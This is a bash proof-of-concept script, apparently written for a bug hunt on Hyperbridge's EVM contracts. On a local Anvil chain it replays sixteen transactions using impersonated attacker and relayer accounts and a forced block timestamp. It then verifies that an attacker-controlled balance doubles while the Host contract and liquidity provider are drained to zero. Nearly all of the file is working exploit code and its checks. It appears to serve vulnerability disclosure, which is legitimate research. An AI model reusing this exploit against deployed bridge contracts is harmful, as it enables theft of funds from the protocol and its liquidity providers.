#!/usr/bin/env bash
set -euo pipefail

EVM=/home/echo/Desktop/hyperbridge_hunt/hyperbridge/evm
POC=/home/echo/Desktop/hyperbridge_hunt/hyperbridge/evm/poc/get-response-timeout-real
cd "$EVM"
mkdir -p "$POC"

FORGE=/home/echo/.foundry/bin/forge
CAST=/home/echo/.foundry/bin/cast
ANVIL=/home/echo/.foundry/bin/anvil

RPC=http://127.0.0.1:18545
CHAIN_ID=31337
FEE=10000000000000000000

JSON=broadcast/GetResponseTimeoutAnvilPoC.s.sol/31337/run-latest.json

EXPECTED_TIMEOUT_TS=$(python3 - "$JSON" <<'PYTS'
import json, sys
from eth_abi import decode
data = json.load(open(sys.argv[1]))["transactions"][12]["transaction"].get("input", "")
arg = bytes.fromhex(data[10:])
resp = decode(['((bytes,bytes,uint64,bytes,uint64,bytes[],uint64,bytes),(bytes,bytes)[])'], arg)[0]
print(resp[0][4])
PYTS
)
DISPATCH_TS=$(python3 - "$EXPECTED_TIMEOUT_TS" <<'PYTS'
import sys
print(int(sys.argv[1]) - 1)
PYTS
)
ANVIL_START_TS=$(python3 - "$DISPATCH_TS" <<'PYTS'
import sys
print(int(sys.argv[1]) - 30)
PYTS
)
echo "expected_response_timeout_ts=$EXPECTED_TIMEOUT_TS"
echo "forcing_dispatch_block_timestamp=$DISPATCH_TS"


DEPLOYER_KEY=0x000000000000000000000000000000000000000000000000000000000000d00d
ATTACKER_KEY=0x00000000000000000000000000000000000000000000000000000000000a11ce
RESPONSE_KEY=0x000000000000000000000000000000000000000000000000000000000000beef
TIMEOUT_KEY=0x000000000000000000000000000000000000000000000000000000000000cafe
LIQUIDITY_KEY=0x000000000000000000000000000000000000000000000000000000000000feed

DEPLOYER_ADDR=$($CAST wallet address "$DEPLOYER_KEY")
ATTACKER_ADDR=0xe66734b95AE0b622aCa9D9acE06fEeEF947bDDC6
RESPONSE_ADDR=$($CAST wallet address "$RESPONSE_KEY")
TIMEOUT_ADDR=$($CAST wallet address "$TIMEOUT_KEY")
LIQUIDITY_ADDR=$($CAST wallet address "$LIQUIDITY_KEY")

FEE_TOKEN=0x28d8256A94E2c64B3B81Fa9EdE1a8419fE9A46Db
HOST=0x6c5Db5C4AcdF476873CC4ef95a401dA662a64D01
APP=0x37747cC60D50FfF47F619E3dD492C143927e063d

echo "=== CAST REPLAY OF FORGE-GENERATED TX INPUTS ON FRESH ANVIL ==="
echo "This does not use forge script broadcast."
echo "Each transaction is sent with cast send or cast send --create and explicit gas."
echo "JSON=$JSON"
echo "deployer=$DEPLOYER_ADDR"
echo "attacker=$ATTACKER_ADDR"
echo "response_relayer=$RESPONSE_ADDR"
echo "timeout_relayer=$TIMEOUT_ADDR"
echo "liquidity_provider=$LIQUIDITY_ADDR"
echo "FeeToken=$FEE_TOKEN"
echo "Host=$HOST"
echo "App=$APP"

"$FORGE" build --force >/dev/null
echo "compile OK"

"$ANVIL" --host 127.0.0.1 --port 18545 --chain-id "$CHAIN_ID" --gas-limit 100000000 --base-fee 0 --gas-price 1 --timestamp "$ANVIL_START_TS" > "$POC/anvil-replay-cast.log" 2>&1 &
ANVIL_PID=$!
trap 'kill "$ANVIL_PID" >/dev/null 2>&1 || true' EXIT

for i in $(seq 1 30); do
  if "$CAST" block-number --rpc-url "$RPC" >/dev/null 2>&1; then
    echo "Anvil ready on attempt $i"
    break
  fi
  sleep 1
done
"$CAST" block-number --rpc-url "$RPC" >/dev/null

GAS_BAL=0x3635c9adc5dea00000
for a in "$DEPLOYER_ADDR" "$ATTACKER_ADDR" "$RESPONSE_ADDR" "$TIMEOUT_ADDR" "$LIQUIDITY_ADDR"; do
  "$CAST" rpc anvil_setBalance "$a" "$GAS_BAL" --rpc-url "$RPC" >/dev/null
done

key_for_from() {
  local f
  f=$(printf '%s' "$1" | tr 'A-F' 'a-f')
  case "$f" in
    $(printf '%s' "$DEPLOYER_ADDR" | tr 'A-F' 'a-f')) echo "$DEPLOYER_KEY" ;;
    $(printf '%s' "$ATTACKER_ADDR" | tr 'A-F' 'a-f')) echo "UNLOCKED" ;;
    $(printf '%s' "$RESPONSE_ADDR" | tr 'A-F' 'a-f')) echo "$RESPONSE_KEY" ;;
    $(printf '%s' "$TIMEOUT_ADDR" | tr 'A-F' 'a-f')) echo "$TIMEOUT_KEY" ;;
    $(printf '%s' "$LIQUIDITY_ADDR" | tr 'A-F' 'a-f')) echo "$LIQUIDITY_KEY" ;;
    *) echo "UNKNOWN_FROM_$1" ;;
  esac
}

tx_field() {
  python3 - "$JSON" "$1" "$2" <<'PY'
import json, sys
p, idx, field = sys.argv[1], int(sys.argv[2]), sys.argv[3]
tx = json.load(open(p))["transactions"][idx]
tr = tx["transaction"]
if field == "label":
    print((tx.get("transactionType") or "") + ":" + (tx.get("contractName") or "") + ":" + (tx.get("function") or ""))
elif field == "to":
    print(tr.get("to") or "")
elif field == "from":
    print(tr.get("from") or "")
elif field == "input":
    print(tr.get("input") or tr.get("data") or "")
elif field == "value":
    print(tr.get("value") or "0x0")
PY
}

json_hash() {
  python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get("transactionHash") or d.get("hash") or "")'
}

receipt_status() {
  python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get("status"))'
}

balance() {
  "$CAST" call "$FEE_TOKEN" 'balanceOf(address)(uint256)' "$1" --rpc-url "$RPC" | awk '{print $1}' | tr -d '[:space:]'
}

echo
echo "Replaying 16 transactions..."
for idx in $(seq 0 15); do
  label=$(tx_field "$idx" label)
  from=$(tx_field "$idx" from)
  to=$(tx_field "$idx" to)
  input=$(tx_field "$idx" input)
  key=$(key_for_from "$from")

  echo
  echo "TX[$idx] $label"
  echo "  from=$from"
  echo "  to=${to:-CREATE}"
  echo "  input_len=${#input}"

  if [[ "$key" == UNKNOWN_FROM_* ]]; then
    echo "FAIL: no key for from=$from"
    exit 30
  fi

  if [ "$idx" = "11" ]; then
    echo "setting next block timestamp for dispatchGet to $DISPATCH_TS"
    "$CAST" rpc evm_setNextBlockTimestamp "$DISPATCH_TS" --rpc-url "$RPC" >/dev/null
  fi

  if [ -z "$to" ]; then
    if [ "$key" = "UNLOCKED" ]; then "$CAST" rpc anvil_impersonateAccount "$from" --rpc-url "$RPC" >/dev/null || true; out=$($CAST send --unlocked --from "$from" --rpc-url "$RPC" --gas-limit 90000000 --gas-price 1 --legacy --json --create "$input"); else out=$("$CAST" send --private-key "$key" --rpc-url "$RPC" --gas-limit 90000000 --gas-price 1 --legacy --json --create "$input"); fi
  else
    if [ "$key" = "UNLOCKED" ]; then "$CAST" rpc anvil_impersonateAccount "$from" --rpc-url "$RPC" >/dev/null || true; out=$("$CAST" send --unlocked --from "$from" --rpc-url "$RPC" --gas-limit 90000000 --gas-price 1 --legacy --json "$to" "$input"); else out=$("$CAST" send --private-key "$key" --rpc-url "$RPC" --gas-limit 90000000 --gas-price 1 --legacy --json "$to" "$input"); fi
  fi
  h=$(printf '%s\n' "$out" | json_hash)
  if [ -z "$h" ]; then
    echo "FAIL: no tx hash parsed for tx $idx"
    exit 31
  fi
  r=$("$CAST" receipt "$h" --rpc-url "$RPC" --json)
  status=$(printf '%s\n' "$r" | receipt_status)
  echo "receipt_status[$idx]=$status"
  if [ "$status" != "0x1" ] && [ "$status" != "1" ]; then
    echo "FAIL: receipt failed for tx $idx"
    exit 32
  fi

  if [ "$idx" = "10" ]; then
    before=$(python3 - "$(balance "$ATTACKER_ADDR")" "$(balance "$RESPONSE_ADDR")" "$(balance "$APP")" <<'PYADD'
import sys
print(sum(int(x) for x in sys.argv[1:]))
PYADD
)
    echo "attacker_controlled_after_app_funding=$before"
    if [ "$before" != "$FEE" ]; then
      echo "FAIL: attacker-controlled balance after funding should be 10 tokens"
      exit 33
    fi
  fi

  if [ "$idx" = "12" ]; then
    response_bal=$(balance "$RESPONSE_ADDR")
    host_bal=$(balance "$HOST")
    echo "after_response_response_relayer=$response_bal"
    echo "after_response_host=$host_bal"
    if [ "$response_bal" != "$FEE" ]; then
      echo "FAIL: response relayer was not paid 10 tokens"
      exit 34
    fi
  fi
done

attacker_final=$(balance "$ATTACKER_ADDR")
response_final=$(balance "$RESPONSE_ADDR")
app_final=$(balance "$APP")
host_final=$(balance "$HOST")
liquidity_final=$(balance "$LIQUIDITY_ADDR")
after=$(python3 - "$attacker_final" "$response_final" "$app_final" <<'PYADD'
import sys
print(sum(int(x) for x in sys.argv[1:]))
PYADD
)

echo
echo "=== CHAIN-VERIFIED FINAL ERC20 BALANCES via cast call ==="
echo "attacker_payer=$attacker_final"
echo "response_relayer=$response_final"
echo "attacker_app=$app_final"
echo "host=$host_final"
echo "liquidity_provider=$liquidity_final"
echo "attacker_controlled_after=$after"

if [ "$attacker_final" != "$FEE" ]; then echo "FAIL: attacker payer final != fee"; exit 40; fi
if [ "$response_final" != "$FEE" ]; then echo "FAIL: response relayer final != fee"; exit 41; fi
if [ "$app_final" != "0" ]; then echo "FAIL: app final != 0"; exit 42; fi
if [ "$host_final" != "0" ]; then echo "FAIL: host final != 0"; exit 43; fi
if [ "$liquidity_final" != "0" ]; then echo "FAIL: liquidity final != 0"; exit 44; fi
expected_after=$(python3 - "$FEE" <<'PYADD'
import sys
print(int(sys.argv[1]) * 2)
PYADD
)
if [ "$after" != "$expected_after" ]; then echo "FAIL: attacker controlled final != 20 tokens"; exit 45; fi

echo
echo "=== TRANSFER EVENTS FROM ANVIL CHAIN ==="
"$CAST" logs --from-block 0 --to-block latest --address "$FEE_TOKEN" 'Transfer(address indexed,address indexed,uint256)' --rpc-url "$RPC" || true

echo
echo "PASS: cast replay Anvil PoC verified."
echo "PASS: every replayed transaction receipt had status=1."
echo "PASS: final balances were verified with cast call."
echo "PASS: attacker-controlled total increased from 10 tokens to 20 tokens; Host and liquidity provider ended at 0."
